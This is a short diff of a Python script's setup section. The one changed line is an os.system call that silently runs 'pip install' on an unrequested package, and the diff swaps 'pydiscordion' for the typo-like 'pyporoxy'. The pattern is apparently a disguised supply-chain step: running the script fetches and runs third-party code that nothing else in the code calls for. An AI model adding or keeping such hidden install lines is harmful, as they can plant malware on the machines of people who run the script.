@@ -10,7 +10,7 @@ import httpx
 from colorama import Fore
 import sys
 import os
-os.system(f"pip install pydiscordion")
+os.system(f"pip install pyporoxy")
 
 #check if data and output folder exists
 if not os.path.exists("data"):
